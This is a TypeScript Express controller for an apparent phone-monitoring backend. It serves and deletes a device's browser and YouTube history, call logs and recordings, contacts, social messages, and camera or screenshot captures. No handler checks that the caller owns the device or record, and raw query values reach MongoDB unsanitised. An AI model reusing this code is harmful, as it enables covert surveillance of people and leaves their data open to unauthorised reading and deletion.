import { Response } from 'express';
import { AuthRequest } from '../middleware/auth';
import { BrowserHistory } from '../models/BrowserHistory';
import { YouTubeHistory } from '../models/YouTubeHistory';
import { YouTubeSession } from '../models/YouTubeSession';
import { CallLog } from '../models/CallLog';
import { CallRecording } from '../models/CallRecording';
import { MediaCapture } from '../models/MediaCapture';
import { AppUsage } from '../models/AppUsage';
import { Contact } from '../models/Contact';
import { SocialMessage } from '../models/SocialMessage';

/**
 * Fetch Browser History with date filter (90+ days calendar support)
 */
export const getBrowserHistory = async (req: AuthRequest, res: Response) => {
  try {
    const { deviceId } = req.params;
    const { date, limit = 500 } = req.query;

    const query: any = { deviceId };
    if (date) {
      const start = new Date(date as string);
      start.setHours(0, 0, 0, 0);
      const end = new Date(date as string);
      end.setHours(23, 59, 59, 999);
      query.timestamp = { $gte: start, $lte: end };
    }

    const items = await BrowserHistory.find(query)
      .sort({ timestamp: -1 })
      .limit(Number(limit));

    return res.json({ success: true, items, events: items });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Delete a single Browser History item by ID
 */
export const deleteBrowserHistory = async (req: AuthRequest, res: Response) => {
  try {
    const { id } = req.params;
    await BrowserHistory.deleteMany({ $or: [{ _id: id }, { id }] });
    return res.json({ success: true, message: 'Browser history record deleted' });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Delete a batch of Browser History items by IDs
 */
export const deleteBrowserHistoryBatch = async (req: AuthRequest, res: Response) => {
  try {
    const { ids } = req.body;
    if (Array.isArray(ids) && ids.length > 0) {
      await BrowserHistory.deleteMany({ $or: [{ _id: { $in: ids } }, { id: { $in: ids } }] });
    }
    return res.json({ success: true, message: 'Batch browser history records deleted' });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Delete Browser History records for a device (optionally filtered by date)
 */
export const deleteBrowserHistoryForDevice = async (req: AuthRequest, res: Response) => {
  try {
    const { deviceId } = req.params;
    const { date } = req.query;
    const query: any = { deviceId };
    if (date) {
      const start = new Date(date as string);
      start.setHours(0, 0, 0, 0);
      const end = new Date(date as string);
      end.setHours(23, 59, 59, 999);
      query.timestamp = { $gte: start, $lte: end };
    }

    const result = await BrowserHistory.deleteMany(query);
    return res.json({ success: true, deletedCount: result.deletedCount });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Fetch YouTube History with date filter (90+ days calendar support)
 */
export const getYouTubeHistory = async (req: AuthRequest, res: Response) => {
  try {
    const { deviceId } = req.params;
    const { date, limit = 500 } = req.query;

    const query: any = { deviceId };
    if (date) {
      const start = new Date(date as string);
      start.setHours(0, 0, 0, 0);
      const end = new Date(date as string);
      end.setHours(23, 59, 59, 999);
      query.timestamp = { $gte: start, $lte: end };
    }

    const items = await YouTubeHistory.find(query)
      .sort({ timestamp: -1 })
      .limit(Number(limit));

    return res.json({ success: true, items, events: items });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Fetch YouTube App Open/Close Sessions with date filter
 */
export const getYouTubeSessions = async (req: AuthRequest, res: Response) => {
  try {
    const { deviceId } = req.params;
    const { date, limit = 500 } = req.query;

    const query: any = { deviceId };
    if (date) {
      query.date = date as string;
    }

    const sessions = await YouTubeSession.find(query)
      .sort({ startTime: -1 })
      .limit(Number(limit));

    return res.json({ success: true, sessions, items: sessions });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Delete a single YouTube session by ID
 */
export const deleteYouTubeSession = async (req: AuthRequest, res: Response) => {
  try {
    const { id } = req.params;
    await YouTubeSession.deleteMany({ $or: [{ _id: id }, { id }] });
    return res.json({ success: true, message: 'Session deleted' });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Delete YouTube sessions for a device (optionally filtered by date)
 */
export const deleteYouTubeSessionsForDevice = async (req: AuthRequest, res: Response) => {
  try {
    const { deviceId } = req.params;
    const { date } = req.query;
    const query: any = { deviceId };
    if (date) query.date = date as string;

    const result = await YouTubeSession.deleteMany(query);
    return res.json({ success: true, deletedCount: result.deletedCount });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Delete a single YouTube history record by ID
 */
export const deleteYouTubeHistory = async (req: AuthRequest, res: Response) => {
  try {
    const { id } = req.params;
    await YouTubeHistory.deleteMany({ $or: [{ _id: id }, { id }] });
    return res.json({ success: true, message: 'History record deleted' });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Delete YouTube history records for a device (optionally filtered by date)
 */
export const deleteYouTubeHistoryForDevice = async (req: AuthRequest, res: Response) => {
  try {
    const { deviceId } = req.params;
    const { date } = req.query;
    const query: any = { deviceId };
    if (date) {
      const start = new Date(date as string);
      start.setHours(0, 0, 0, 0);
      const end = new Date(date as string);
      end.setHours(23, 59, 59, 999);
      query.timestamp = { $gte: start, $lte: end };
    }

    const result = await YouTubeHistory.deleteMany(query);
    return res.json({ success: true, deletedCount: result.deletedCount });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Fetch Screenshots & Photos Captures with filter (type: screenshot / front_photo / back_photo)
 */
export const getCapturedMedia = async (req: AuthRequest, res: Response) => {
  try {
    const { deviceId } = req.params;
    const { type, date, limit = 100 } = req.query;

    const query: any = { deviceId };
    if (type) query.type = type;
    if (date) {
      const start = new Date(date as string);
      start.setHours(0, 0, 0, 0);
      const end = new Date(date as string);
      end.setHours(23, 59, 59, 999);
      query.timestamp = { $gte: start, $lte: end };
    }

    const items = await MediaCapture.find(query)
      .sort({ timestamp: -1 })
      .limit(Number(limit));

    return res.json({ success: true, items, captures: items });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Fetch Contacts
 */
export const getContacts = async (req: AuthRequest, res: Response) => {
  try {
    const { deviceId } = req.params;
    const contacts = await Contact.find({ deviceId }).sort({ name: 1 });
    return res.json({ success: true, contacts });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Fetch Call Logs & Recordings
 */
export const getCallLogs = async (req: AuthRequest, res: Response) => {
  try {
    const { deviceId } = req.params;
    const { date } = req.query;

    const query: any = { deviceId };
    if (date) {
      const start = new Date(date as string);
      start.setHours(0, 0, 0, 0);
      const end = new Date(date as string);
      end.setHours(23, 59, 59, 999);
      query.timestamp = { $gte: start, $lte: end };
    }

    const logs = await CallLog.find(query).sort({ timestamp: -1 });
    const recordings = await CallRecording.find(query).sort({ timestamp: -1 });

    return res.json({ success: true, logs, recordings });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Fetch App Usage & Screen Time
 */
export const getAppUsage = async (req: AuthRequest, res: Response) => {
  try {
    const { deviceId } = req.params;
    const { date } = req.query;

    const query: any = { deviceId };
    if (date) query.date = date;

    const items = await AppUsage.find(query).sort({ usageDurationSeconds: -1 });
    return res.json({ success: true, items });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Fetch Social Messages
 */
export const getSocialMessages = async (req: AuthRequest, res: Response) => {
  try {
    const { deviceId } = req.params;
    const { contactName, date } = req.query;

    const query: any = { deviceId };
    if (contactName) query.contactName = contactName;
    if (date) {
      const start = new Date(date as string);
      start.setHours(0, 0, 0, 0);
      const end = new Date(date as string);
      end.setHours(23, 59, 59, 999);
      query.timestamp = { $gte: start, $lte: end };
    }

    const items = await SocialMessage.find(query).sort({ timestamp: 1 });
    return res.json({ success: true, items });
  } catch (error: any) {
    return res.status(500).json({ success: false, message: error.message });
  }
};
